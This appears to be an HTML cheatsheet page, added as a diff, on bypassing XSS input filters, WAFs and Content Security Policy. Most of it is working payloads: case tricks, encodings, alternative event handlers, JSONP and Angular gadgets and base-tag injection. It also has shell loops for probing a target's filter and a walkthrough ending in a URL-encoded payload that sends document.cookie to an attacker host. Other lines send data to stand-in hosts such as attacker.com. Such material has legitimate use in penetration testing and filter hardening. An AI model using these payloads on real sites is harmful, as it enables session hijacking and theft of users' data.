@@ -1,0 +1,414 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Filter Bypasses · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › XSS</nav><h1>Filter Bypasses</h1><p class="cx-lede">WAF and input-filter evasion for XSS - the canonical bypass categories (case juggling, character substitution, HTML/URL/Unicode encoding, alternative event handlers, JS without parens/spaces/quotes), the CSP bypass landscape (JSONP gadgets, dangling scripts, Angular templates, base-tag tricks), and the systematic methodology for discovering exactly which characters and patterns are filtered.</p><div class="cx-tags"><span class="cx-tag">MITRE T1059.007, T1027</span><span class="cx-tag">D3FEND D3-AH</span><span class="cx-tag">IMPACT SessionTakeover, FilterBypass</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When the obvious XSS payload is blocked, the answer is rarely "no XSS here" and usually "the filter doesn't cover variant N." Bypass categories: case juggling, character substitution, encoding (HTML/URL/Unicode), tag substitution, alternative event handlers, parentheses-free JS, and CSP bypass via on-origin gadgets.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Filter blocks &lt;script&gt; tags
+&lt;svg onload=alert(1)&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;             # case
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;   # nested replacement
+
+# Filter blocks alert(
+alert`1`                              # tagged template
+prompt(1) / confirm(1)                # synonyms
+window[&#x27;ale&#x27;+&#x27;rt&#x27;](1)                 # bracket access
+top[&#x27;al\x65rt&#x27;](1)                    # escape sequence in name
+
+# Filter blocks specific characters
+%3Csvg%20onload%3Dalert(1)%3E         # URL encoding
+&amp;lt;svg onload=alert(1)&amp;gt;           # HTML encoding (depends on context)
+\u003csvg onload=alert(1)\u003e       # Unicode escape (JS context)
+
+# CSP blocks inline scripts
+&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;   # iframe srcdoc inherits parent&#x27;s CSP only sometimes
+&lt;base href=//attacker/&gt;                       # redirect relative scripts</code></pre></figure>
+<p>Success indicator: the bypassed payload reaches the rendering context and JavaScript executes. The systematic methodology below maps the filter's exact rules so the bypass is predictable, not lucky.</p>
+<h2 id="filter-discovery-methodology">Filter discovery methodology</h2>
+<p>Before bypassing, map what the filter actually blocks. Send a series of probes and observe response differences:</p>
+<h3 id="step-1-test-individual-characters">Step 1 - Test individual characters</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># What character set survives encoding?
+for c in &#x27;&lt;&#x27; &#x27;&gt;&#x27; &#x27;&quot;&#x27; &quot;&#x27;&quot; &#x27;(&#x27; &#x27;)&#x27; &#x27;`&#x27; &#x27;/&#x27; &#x27;;&#x27; &#x27;=&#x27; &#x27; &#x27;; do
+    encoded=$(python3 -c &quot;import urllib.parse; print(urllib.parse.quote(&#x27;$c&#x27;))&quot;)
+    response=$(curl -s &quot;http://target/page?q=test${encoded}canary&quot;)
+    echo &quot;$c: $(echo &quot;$response&quot; | grep -o &quot;test.canary&quot; | head -1)&quot;
+done</code></pre></figure>
+<p>Output reveals which characters get escaped, encoded, or replaced:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;: test_canary           # &lt; replaced with _
+&gt;: test_canary           # &gt; replaced with _
+&quot;: test&amp;quot;canary       # &quot; HTML-entity encoded
+&#x27;: test&amp;#39;canary        # &#x27; HTML-entity encoded
+(: test(canary           # ( survives unchanged
+): test)canary           # ) survives unchanged
+`: test`canary           # ` survives
+/: test/canary           # / survives
+;: test;canary           # ; survives
+=: test=canary           # = survives
+ : test canary           # space survives</code></pre></figure>
+<p>In this case, <code>&lt;</code> and <code>&gt;</code> are stripped. Direct <code>&lt;script&gt;</code> injection is dead. But <code>(</code>, <code>)</code>, <code>`</code>, <code>/</code>, <code>;</code>, <code>=</code> all survive - there may still be a payload class that doesn't need angle brackets (e.g., already-injecting-into-an-attribute case).</p>
+<h3 id="step-2-test-specific-patterns">Step 2 - Test specific patterns</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># What patterns get blocked beyond just chars?
+for payload in &#x27;script&#x27; &#x27;alert&#x27; &#x27;onerror&#x27; &#x27;onclick&#x27; &#x27;javascript&#x27; &#x27;svg&#x27; &#x27;img&#x27; &#x27;iframe&#x27;; do
+    response=$(curl -s &quot;http://target/page?q=test_${payload}_canary&quot;)
+    echo &quot;$payload: $(echo &quot;$response&quot; | grep -o &quot;test.*canary&quot; | head -1)&quot;
+done</code></pre></figure>
+<p>Reveals keyword-based blocklists:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>script: test__canary           # &quot;script&quot; replaced with empty string
+alert: test__canary            # &quot;alert&quot; replaced
+onerror: test_onerror_canary   # &quot;onerror&quot; survives
+onclick: test__canary          # &quot;onclick&quot; replaced
+javascript: test_javascript_canary    # survives
+svg: test_svg_canary           # survives</code></pre></figure>
+<p>Now the filter shape is clear: it blocks <code>script</code>, <code>alert</code>, <code>onclick</code>, but allows <code>onerror</code>, <code>javascript</code>, <code>svg</code>. Build payloads from what survives.</p>
+<h3 id="step-3-test-the-response-context">Step 3 - Test the response context</h3>
+<p>Repeat both probes for <em>each</em> page and parameter. Different parameters often use different filter rules - <code>?q=</code> might pass <code>&lt;script&gt;</code> while <code>?type=</code> strips it; <code>?email=</code> might URL-encode while <code>?name=</code> doesn't.</p>
+<h2 id="bypass-category-1-case-manipulation">Bypass category 1 - case manipulation</h2>
+<p>Most regex-based filters are case-sensitive by default:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;SVG ONLOAD=ALERT(1)&gt;
+JAVASCRIPT:alert(1)</code></pre></figure>
+<p>HTML is case-insensitive - <code>&lt;ScRiPt&gt;</code> is just as valid as <code>&lt;script&gt;</code> from the browser's perspective. A regex like <code>/&lt;script&gt;/</code> doesn't match <code>&lt;sCrIpT&gt;</code> unless it has the <code>i</code> flag.</p>
+<p>In practice, most modern filters are case-insensitive. Test before relying on this. When it works, it's the lowest-effort bypass.</p>
+<h2 id="bypass-category-2-duplication-nested-substitution">Bypass category 2 - duplication / nested substitution</h2>
+<p>Filters that strip the matched pattern <em>once</em> are bypassed by nesting:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></pre></figure>
+<p>After the filter strips the inner <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre></figure>
+<p>The filter saw the inner tag, removed it, the outer characters merged into a valid <code>&lt;script&gt;</code> block.</p>
+<p>Variations:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;&lt;script&gt;script&gt;alert(1)&lt;&lt;/script&gt;/script&gt;
+&lt;a&lt;a&gt;lert(1)&gt;</code></pre></figure>
+<p>Works when the filter does a single pass. Modern filters typically iterate to fixed point, defeating this. Worth testing.</p>
+<h2 id="bypass-category-3-encoding">Bypass category 3 - encoding</h2>
+<p>The browser decodes HTML entities, URL encoding, and Unicode escapes at different times in different contexts. The filter sees one form, the browser sees another.</p>
+<h3 id="html-entities">HTML entities</h3>
+<p>Inside HTML attributes (and sometimes elsewhere), HTML entities are decoded by the browser:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;a href=&quot;java&amp;#x73;cript:alert(1)&quot;&gt;click&lt;/a&gt;   &lt;!-- &amp;#x73; = s; href becomes javascript:... --&gt;
+&lt;a href=&quot;java&amp;Tab;script:alert(1)&quot;&gt;click&lt;/a&gt;   &lt;!-- Tab entity inside scheme --&gt;
+&lt;a href=&quot;java&amp;NewLine;script:alert(1)&quot;&gt;click&lt;/a&gt;</code></pre></figure>
+<p>The filter sees <code>java&amp;#x73;cript:</code> and concludes "not the javascript scheme." Browser decodes the entity and sees <code>javascript:</code>.</p>
+<p>Notable entities for XSS:</p>
+<table>
+<thead>
+<tr>
+<th>Entity</th>
+<th>Decoded</th>
+<th>Use case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&amp;#9;</code> / <code>&amp;Tab;</code></td>
+<td>tab</td>
+<td>Inserts whitespace mid-keyword</td>
+</tr>
+<tr>
+<td><code>&amp;#10;</code> / <code>&amp;NewLine;</code></td>
+<td>newline</td>
+<td>Same</td>
+</tr>
+<tr>
+<td><code>&amp;#x0;</code></td>
+<td>null byte</td>
+<td>Bypasses some C-string filters</td>
+</tr>
+<tr>
+<td><code>&amp;#x3C;</code> / <code>&amp;lt;</code></td>
+<td><code>&lt;</code></td>
+<td>Doesn't help in HTML context (still HTML-decoded back to text), but in JS string contexts that interpret entities</td>
+</tr>
+<tr>
+<td><code>&amp;quot;</code></td>
+<td><code>"</code></td>
+<td>Same</td>
+</tr>
+<tr>
+<td><code>&amp;apos;</code></td>
+<td><code>'</code></td>
+<td>Same</td>
+</tr>
+</tbody>
+</table>
+<h3 id="url-encoding">URL encoding</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%3Csvg%20onload%3Dalert(1)%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code></pre></figure>
+<p>Most servers URL-decode at routing. The filter (if URL-decoding-aware) sees decoded content; otherwise it sees <code>%3C</code> literals. Many filters lag behind one decode step. Worth a try.</p>
+<h3 id="double-url-encoding">Double URL encoding</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%253Csvg%2520onload%253Dalert(1)%253E</code></pre></figure>
+<p><code>%25</code> = <code>%</code>. The server decodes once → <code>%3Csvg%20...%3E</code>. The decoded form is still URL-encoded. The filter scans and sees URL-encoded text, concludes "no payload." The application decodes again at use time → <code>&lt;svg onload=...&gt;</code> → renders → XSS.</p>
+<p>Works against filters that decode-then-scan but allow the final use to also decode.</p>
+<h3 id="unicode-escape-js-contexts-only">Unicode escape (JS contexts only)</h3>
+<p>Inside JavaScript:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">\u003cscript\u003ealert(1)\u003c/script\u003e</code></pre></figure>
+<p><code>\u003c</code> is <code>&lt;</code>. The filter scanning the URL parameter sees the literal <code>\u003c</code> chars; the JS parser decodes the escape.</p>
+<p>For this to work, the payload must land in a JS context where escapes are processed (variable assignment, eval, string literal). Not HTML context.</p>
+<h3 id="hex-escape-js-string-contexts">Hex escape (JS string contexts)</h3>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">&quot;\x3cscript\x3ealert(1)\x3c/script\x3e&quot;</code></pre></figure>
+<p>Same logic as Unicode; <code>\x</code> for hex pairs. Slightly shorter than <code>\u</code>.</p>
+<h2 id="bypass-category-4-alternative-tags-and-event-handlers">Bypass category 4 - alternative tags and event handlers</h2>
+<p>When <code>&lt;script&gt;</code> is blocked, the universe of tags that fire JS is vast. Each adds a row to the filter's blocklist; most filters don't cover the long tail.</p>
+<h3 id="tags-that-fire-onload-onerror-immediately">Tags that fire <code>onload</code> / <code>onerror</code> immediately</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;
+&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot; onload=alert(1)&gt;
+&lt;input autofocus onfocus=alert(1)&gt;
+&lt;select autofocus onfocus=alert(1)&gt;
+&lt;textarea autofocus onfocus=alert(1)&gt;
+&lt;keygen autofocus onfocus=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;meter value=0 onmouseover=alert(1)&gt;</code></pre></figure>
+<h3 id="event-handlers-that-arent-onclick-onerror">Event handlers that aren't <code>onclick</code> / <code>onerror</code></h3>
+<p>Many filters check for the well-known event names. The full list of HTML event handlers is much larger:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>onafterprint onafterscriptexecute onanimationcancel onanimationend
+onanimationiteration onanimationstart onauxclick onbeforecopy
+onbeforecut onbeforeinput onbeforeprint onbeforescriptexecute
+onbeforeunload onblur oncanplay oncanplaythrough onchange
+onclick onclose oncontextmenu oncopy oncuechange oncut
+ondblclick ondrag ondragend ondragenter ondragexit ondragleave
+ondragover ondragstart ondrop ondurationchange onemptied onended
+onerror onfocus onfocusin onfocusout onformdata onfullscreenchange
+onfullscreenerror ongesturechange ongestureend ongesturestart
+onhashchange oninput oninvalid onkeydown onkeypress onkeyup
+onload onloadeddata onloadedmetadata onloadend onloadstart
+onmessage onmousedown onmouseenter onmouseleave onmousemove
+onmouseout onmouseover onmouseup onmousewheel onoffline ononline
+onpagehide onpageshow onpaste onpause onplay onplaying
+onpointercancel onpointerdown onpointerenter onpointerleave
+onpointermove onpointerout onpointerover onpointerrawupdate
+onpointerup onpopstate onprogress onratechange onresize onscroll
+onsearch onseeked onseeking onselect onselectionchange onselectstart
+onshow onslotchange onstalled onstorage onsubmit onsuspend
+ontimeupdate ontoggle ontouchcancel ontouchend ontouchmove
+ontouchstart ontransitioncancel ontransitionend ontransitionrun
+ontransitionstart onunhandledrejection onunload onvolumechange
+onwaiting onwebkitanimationend onwebkitanimationiteration
+onwebkitanimationstart onwebkittransitionend onwheel</code></pre></figure>
+<p>When <code>onclick</code> and <code>onerror</code> are blocked, <code>onpointerover</code>, <code>ontoggle</code>, <code>onfocusin</code> are usually free. The newer / less-known event names slip through keyword filters.</p>
+<h3 id="less-common-firing-patterns">Less-common firing patterns</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;click&lt;/button&gt;&lt;/form&gt;
+&lt;form action=javascript:alert(1)&gt;&lt;button&gt;click&lt;/button&gt;&lt;/form&gt;
+&lt;a href=javascript:alert(1)&gt;click&lt;/a&gt;
+&lt;isindex action=javascript:alert(1) type=submit&gt;  &lt;!-- legacy HTML4 --&gt;</code></pre></figure>
+<h2 id="bypass-category-5-javascript-level-bypass">Bypass category 5 - JavaScript-level bypass</h2>
+<p>When the surrounding context is "your input ends up inside <code>eval()</code> or <code>Function()</code>" but specific characters are filtered:</p>
+<h3 id="without-parentheses">Without parentheses</h3>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">alert`1`                            // tagged template literal - alert is invoked with array of strings
+onerror=alert;throw 1               // throw inside try-equivalent calls onerror; arg is what was thrown
+Object.defineProperty(top,&#x27;a&#x27;,{get:alert});top.a   // getter trick</code></pre></figure>
+<p>The <code>throw</code> trick is particularly elegant - <code>throw</code> invokes whatever's in <code>window.onerror</code> (or any onerror handler) with the thrown value as argument. If <code>onerror=alert</code>, <code>throw 1</code> runs <code>alert(1)</code> without an explicit call.</p>
+<h3 id="without-quotes">Without quotes</h3>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">alert(/xss/.source)                 // regex literal - .source is the regex body as string
+alert(String.fromCharCode(88,83,83))    // 88 = X, 83 = S, etc.
+alert(atob(&#x27;WFNT&#x27;))                 // base64-decoded</code></pre></figure>
+<h3 id="without-specific-keywords">Without specific keywords</h3>
+<p>When <code>alert</code> is filtered, the synonyms:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">prompt(1)
+confirm(1)
+window[&#x27;ale&#x27; + &#x27;rt&#x27;](1)              // string concatenation
+top[&#x27;ale&#x27; + &#x27;rt&#x27;](1)
+parent[&#x27;ale&#x27; + &#x27;rt&#x27;](1)
+[].constructor.constructor(&#x27;alert(1)&#x27;)()    // Function constructor via [].constructor
+({}).constructor.constructor(&#x27;alert(1)&#x27;)()  // same</code></pre></figure>
+<h3 id="without-alert-at-all">Without <code>alert</code> at all</h3>
+<p>The point of XSS isn't <code>alert</code> - it's executing arbitrary JS. Any function that does observable work proves XSS:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">fetch(&#x27;//attacker:8000/?xss&#x27;)           // GET to attacker
+document.title=&#x27;XSS&#x27;                     // changes page title
+location=&#x27;//attacker&#x27;                    // navigates page (loud but clear)
+console.log(&#x27;XSS&#x27;)                       // doesn&#x27;t prove it to a victim but proves to operator</code></pre></figure>
+<p>Most "alert is blocked" filters don't block <code>fetch</code> or <code>location</code>. Use what isn't blocked.</p>
+<h2 id="bypass-category-6-quote-free-space-free">Bypass category 6 - quote-free / space-free</h2>
+<p>Sometimes attribute breakouts can't use spaces or quotes (filter strips them):</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- Need to fire onerror without space between attribute and value --&gt;
+&lt;img/src=x/onerror=alert(1)&gt;             &lt;!-- slash works as attribute separator --&gt;
+&lt;img%09src=x%09onerror=alert(1)&gt;          &lt;!-- tab --&gt;
+&lt;img%0Asrc=x%0Aonerror=alert(1)&gt;          &lt;!-- newline --&gt;
+&lt;img%0Csrc=x%0Conerror=alert(1)&gt;          &lt;!-- form feed --&gt;</code></pre></figure>
+<p>Without quotes:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;             &lt;!-- already quote-free for simple cases --&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;a href=javascript:alert(1)&gt;             &lt;!-- unquoted href value --&gt;</code></pre></figure>
+<h2 id="csp-bypass">CSP bypass</h2>
+<p>Content Security Policy is the modern XSS countermeasure. A page with strict CSP blocks inline scripts and event handlers. Most XSS payloads stop working. Bypass strategies depend on the policy.</p>
+<h3 id="csp-policy-variants">CSP policy variants</h3>
+<p>Read the <code>Content-Security-Policy</code> header to know what you're up against:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</code></pre></figure>
+<p>Means: scripts can only come from same-origin URLs (<code>&lt;script src="/file.js"&gt;</code>). Inline <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> blocked. Event handlers blocked. <code>eval</code> blocked.</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;</code></pre></figure>
+<p><code>'unsafe-inline'</code> allows inline scripts. CSP is decorative; XSS works normally.</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-eval&#x27;</code></pre></figure>
+<p>Inline blocked but <code>eval</code>, <code>setTimeout(string)</code>, <code>Function(...)</code> allowed. DOM XSS via eval still works.</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">Content-Security-Policy: script-src &#x27;self&#x27; &#x27;strict-dynamic&#x27; &#x27;nonce-abc123&#x27;</code></pre></figure>
+<p><code>strict-dynamic</code> allows scripts loaded by <code>'self'</code> scripts to load further scripts. Inline blocked unless they have <code>nonce-abc123</code>. If you can read the nonce from elsewhere on the page, include it in your script tag.</p>
+<h3 id="csp-bypass-jsonp-gadget">CSP bypass - JSONP gadget</h3>
+<p>If the page's origin hosts a JSONP endpoint:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>https://target/api/jsonp?callback=alert</code></pre></figure>
+<p>This returns <code>alert(...)</code> which is valid JS. If CSP allows scripts from <code>'self'</code>, then:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script src=&quot;/api/jsonp?callback=alert(document.domain)//&quot;&gt;&lt;/script&gt;</code></pre></figure>
+<p>The script loads from same-origin (CSP allowed), but its content is attacker-controlled because the callback parameter is reflected.</p>
+<p>Search the target's origin for JSONP endpoints: <code>?callback=</code>, <code>?cb=</code>, <code>?jsonp=</code> parameters that return executable JS.</p>
+<h3 id="csp-bypass-angular-templates">CSP bypass - Angular templates</h3>
+<p>If the page loads AngularJS (any version 1.x) from same-origin and a CSP allows <code>'self'</code> scripts:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;div ng-app ng-csp&gt;
+    {{constructor.constructor(&#x27;alert(1)&#x27;)()}}
+&lt;/div&gt;</code></pre></figure>
+<p>Angular's template evaluator executes <code>{{...}}</code> even when CSP blocks JS. The <code>constructor.constructor</code> chain reaches the Function constructor through Object's prototype chain.</p>
+<p>The pattern works whenever angular is loaded and the injection lands in HTML context.</p>
+<h3 id="csp-bypass-base-href-injection">CSP bypass - <code>&lt;base href&gt;</code> injection</h3>
+<p>If CSP allows scripts from <code>'self'</code> and the page loads scripts via relative URLs:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script src=&quot;/static/app.js&quot;&gt;&lt;/script&gt;</code></pre></figure>
+<p>Inject a <code>&lt;base&gt;</code> tag earlier in the document:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;base href=&quot;//attacker.com/&quot;&gt;</code></pre></figure>
+<p>Relative URLs now resolve against <code>attacker.com</code>. The page's <code>&lt;script src="/static/app.js"&gt;</code> becomes <code>&lt;script src="//attacker.com/static/app.js"&gt;</code>. Attacker controls the script content.</p>
+<p>CSP <code>'self'</code> matches by origin at the time of resource fetch, after <code>&lt;base&gt;</code> is applied - so <code>attacker.com/static/app.js</code> doesn't match <code>'self'</code>. But some CSP implementations check <code>&lt;base&gt;</code> before applying it, so the bypass still works in those cases.</p>
+<h3 id="csp-bypass-dangling-markup-injection">CSP bypass - dangling markup injection</h3>
+<p>When CSP blocks JS execution but allows CSS / image loading:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;img src=&quot;//attacker.com/?data=</code></pre></figure>
+<p>The unclosed <code>&lt;img&gt;</code> tag captures everything that follows on the page until the next quote. The image URL becomes <code>//attacker.com/?data=&lt;rest of page&gt;</code> - exfiltrates DOM contents to attacker.</p>
+<p>Doesn't execute JS but extracts data. Useful in CSP-locked environments where the goal is data theft, not arbitrary code.</p>
+<h3 id="csp-nonce-reuse">CSP nonce reuse</h3>
+<p>When CSP uses <code>nonce-XXX</code>, every <code>&lt;script&gt;</code> tag must include <code>nonce="XXX"</code>. If you can inject a <code>&lt;script&gt;</code> with the nonce, it executes:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script nonce=&quot;XXX&quot;&gt;alert(1)&lt;/script&gt;</code></pre></figure>
+<p>But where do you get the nonce? Sometimes it's in the page already (e.g., a <code>&lt;script nonce="XXX"&gt;</code> already in the HTML). Read it via DOM, reuse it. Specifically:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">// In an injected event handler:
+document.body.appendChild(Object.assign(document.createElement(&#x27;script&#x27;), {
+    nonce: document.querySelector(&#x27;script[nonce]&#x27;).nonce,
+    textContent: &#x27;alert(1)&#x27;
+}));</code></pre></figure>
+<p>Of course, this requires JS execution to begin with - chicken-and-egg unless you have a non-script-tag XSS (e.g., a permitted event handler somewhere).</p>
+<h2 id="a-worked-walkthrough-bypassing-a-layered-filter">A worked walkthrough - bypassing a layered filter</h2>
+<p>Target: <code>?q=</code> parameter, reflected into HTML body. Filter regime: blocks <code>script</code>, <code>alert</code>, <code>&lt;svg</code>, <code>onerror</code>, but allows <code>onclick</code>.</p>
+<h3 id="round-1-confirm-filter-rules">Round 1 - Confirm filter rules</h3>
+<p>Probe each:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?q=test&lt;svg test     → test_test          (svg blocked)
+?q=test&lt;svg test     → test test          (no change)
+?q=test alert test   → test  test         (alert blocked)
+?q=test onerror test → test  test         (onerror blocked)
+?q=test onclick test → test onclick test  (onclick survives)
+?q=test&lt;img test     → test&lt;img test      (img survives)
+?q=test prompt test  → test prompt test   (prompt survives)</code></pre></figure>
+<h3 id="round-2-build-from-what-survives">Round 2 - Build from what survives</h3>
+<p><code>&lt;img&gt;</code> survives, <code>onerror</code> doesn't, but <code>onclick</code> does. Try:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?q=&lt;img src=x onclick=prompt(1)&gt;</code></pre></figure>
+<p>Result:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;div&gt;&lt;img src=x onclick=prompt(1)&gt;&lt;/div&gt;</code></pre></figure>
+<p>XSS via click. Drawback: needs user interaction. To make it auto-fire, try other event handlers in the survives-the-filter set:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?q=test ontoggle test  → test ontoggle test    (survives)
+?q=test onpointerover test → test onpointerover test</code></pre></figure>
+<p><code>ontoggle</code> survives. Pair with <code>&lt;details&gt;</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?q=&lt;details open ontoggle=prompt(1)&gt;</code></pre></figure>
+<p>Auto-fires on <code>&lt;details&gt;</code> element being open. Result: XSS, no user interaction needed.</p>
+<h3 id="round-3-make-the-impact-real">Round 3 - Make the impact real</h3>
+<p>The proof-of-concept is <code>prompt(1)</code>. For actual session theft:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?q=&lt;details open ontoggle=&quot;new Image().src=&#x27;http://attacker:8000/?c=&#x27;+btoa(document.cookie)&quot;&gt;</code></pre></figure>
+<p>URL-encoded for clean delivery:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?q=%3Cdetails%20open%20ontoggle%3D%22new%20Image().src%3D%27http%3A%2F%2Fattacker%3A8000%2F%3Fc%3D%27%2Bbtoa(document.cookie)%22%3E</code></pre></figure>
+<p>Successful filter bypass with practical impact.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Bypass</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Case juggling</td>
+<td><code>&lt;sCrIpT&gt;</code>, <code>OnClIcK</code>, <code>JaVaScRiPt:</code></td>
+</tr>
+<tr>
+<td>Nested replacement</td>
+<td><code>&lt;scr&lt;script&gt;ipt&gt;...&lt;/scr&lt;/script&gt;ipt&gt;</code></td>
+</tr>
+<tr>
+<td>HTML entity in URL scheme</td>
+<td><code>java&amp;Tab;script:alert(1)</code></td>
+</tr>
+<tr>
+<td>HTML entity in keyword</td>
+<td><code>&lt;a href="java&amp;#x73;cript:alert(1)"&gt;</code></td>
+</tr>
+<tr>
+<td>URL encoding</td>
+<td><code>%3Csvg%20onload%3Dalert(1)%3E</code></td>
+</tr>
+<tr>
+<td>Double URL encoding</td>
+<td><code>%253Csvg%2520onload%253Dalert(1)%253E</code></td>
+</tr>
+<tr>
+<td>Unicode escape in JS</td>
+<td><code>\u003cscript\u003e</code></td>
+</tr>
+<tr>
+<td>Hex escape in JS string</td>
+<td><code>"\x3cscript\x3e"</code></td>
+</tr>
+<tr>
+<td>Alternative auto-firing tag</td>
+<td><code>&lt;svg onload=&gt;</code>, <code>&lt;details open ontoggle=&gt;</code>, <code>&lt;input autofocus onfocus=&gt;</code></td>
+</tr>
+<tr>
+<td>Less-known event</td>
+<td><code>ontoggle</code>, <code>onfocusin</code>, <code>onpointerover</code>, <code>onbeforeinput</code></td>
+</tr>
+<tr>
+<td>Alert synonyms</td>
+<td><code>prompt(1)</code>, <code>confirm(1)</code>, <code>window['ale'+'rt'](1)</code></td>
+</tr>
+<tr>
+<td>No parens</td>
+<td><code>alert`1`</code>, <code>onerror=alert;throw 1</code></td>
+</tr>
+<tr>
+<td>No quotes</td>
+<td><code>alert(/xss/.source)</code>, <code>alert(String.fromCharCode(88))</code></td>
+</tr>
+<tr>
+<td>No spaces</td>
+<td><code>&lt;img/src=x/onerror=alert(1)&gt;</code>, <code>&lt;img%09src=x%09onerror=&gt;</code></td>
+</tr>
+<tr>
+<td>CSP <code>'unsafe-inline'</code></td>
+<td>Just use inline scripts; CSP doesn't help</td>
+</tr>
+<tr>
+<td>CSP <code>'unsafe-eval'</code></td>
+<td>Use <code>eval(...)</code>, <code>setTimeout("...")</code>, <code>Function(...)</code></td>
+</tr>
+<tr>
+<td>CSP <code>'strict-dynamic'</code></td>
+<td>Need nonce or hash; check page for existing nonces</td>
+</tr>
+<tr>
+<td>CSP <code>'self'</code> + JSONP</td>
+<td><code>&lt;script src="/api/jsonp?callback=alert(1)//"&gt;</code></td>
+</tr>
+<tr>
+<td>CSP + Angular</td>
+<td><code>{{constructor.constructor('alert(1)')()}}</code></td>
+</tr>
+<tr>
+<td>CSP + base href</td>
+<td><code>&lt;base href="//attacker/"&gt;</code></td>
+</tr>
+<tr>
+<td>Filter discovery probe</td>
+<td>Loop characters, observe encoding; loop keywords, observe replacement</td>
+</tr>
+<tr>
+<td>Confirm filter is single-pass</td>
+<td>Try <code>&lt;scr&lt;script&gt;ipt&gt;</code></td>
+</tr>
+</tbody>
+</table>
